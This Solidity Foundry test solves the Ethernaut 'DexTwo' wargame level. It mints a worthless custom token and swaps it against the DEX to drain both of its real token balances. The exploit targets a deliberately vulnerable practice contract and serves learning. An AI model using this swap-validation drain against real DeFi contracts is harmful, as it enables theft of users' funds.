//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../core/Ethernaut.sol';
import '../levels/23-DexTwo/Shitcoin.sol';
import '../levels/23-DexTwo/DexTwoFactory.sol';

contract DexTwoTest is DSTest {
  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    // Setup instance of the Ethernaut contract
    ethernaut = new Ethernaut();
    vm.deal(attacker, 100 ether); // fund our attacker contract with 1 ether
  }

  function min(uint256 a, uint256 b) internal pure returns (uint256) {
    return a <= b ? a : b;
  }

  function testDexTwoHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------

    DexTwoFactory dexFactory = new DexTwoFactory();
    ethernaut.registerLevel(dexFactory);
    vm.startPrank(attacker);
    address levelAddress = ethernaut.createLevelInstance(dexFactory);
    DexTwo ethernautDexTwo = DexTwo(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    Shitcoin attackToken = new Shitcoin('Token 3', 'TKN3');
    address tkn_one_address = ethernautDexTwo.token1();
    address tkn_two_address = ethernautDexTwo.token2();
    address tkn_three_address = address(attackToken);

    ERC20(tkn_three_address).approve(
      address(ethernautDexTwo),
      type(uint256).max
    );
    ethernautDexTwo.add_liquidity(tkn_three_address, 1e9);
    ethernautDexTwo.swap(
      tkn_three_address,
      tkn_one_address,
      ethernautDexTwo.balanceOf(tkn_three_address, address(ethernautDexTwo))
    );
    ethernautDexTwo.swap(
      tkn_three_address,
      tkn_two_address,
      ethernautDexTwo.balanceOf(tkn_three_address, address(ethernautDexTwo))
    );

    assertEq(
      ethernautDexTwo.balanceOf(tkn_one_address, address(ethernautDexTwo)),
      0
    );
    assertEq(
      ethernautDexTwo.balanceOf(tkn_two_address, address(ethernautDexTwo)),
      0
    );

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------

    bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(levelSuccessfullyPassed);
  }
}
